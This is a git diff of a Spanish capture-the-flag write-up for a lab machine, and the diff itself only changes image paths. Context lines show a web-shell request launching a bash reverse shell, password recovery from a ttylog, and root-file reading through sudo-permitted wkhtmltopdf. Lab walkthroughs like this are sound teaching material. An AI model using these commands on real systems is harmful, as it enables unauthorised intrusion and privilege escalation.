@@ -34,7 +34,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 En el puerto 80 encontramos lo siguiente:  
-![alt text](./posts/img/hotel001.png)
+![alt text](img/hotel001.png)
 
 ## Intrusión
 
@@ -97,7 +97,7 @@ http://192.168.1.163/dati/selectappartamenti.php?cmd=bash%20-c%20%22bash%20-i%20
 
 En el directorio **/var/www/html** encontramos un archivo interesante llamado `ttylog`, el cual descargamos para analizarlo en nuestra máquina.  
 Con la herramienta **ttyplay** lo ejecutamos y conseguimos la contraseña del usuario **person**:  
-![alt text](./posts/img/hotel002.png)
+![alt text](img/hotel002.png)
 
 Vemos que `person` puede ejecutar la herramienta **wkhtmltopdf** como root:
 
@@ -131,6 +131,6 @@ wget 192.168.1.163:5000/root.pdf
 ```
 
 Al abrirlo, vemos que contiene la flag de **/root/root.txt**:  
-![alt text](./posts/img/hotel003.png)
+![alt text](img/hotel003.png)
 
 ¡Ya tenemos la flag de root! 🎉
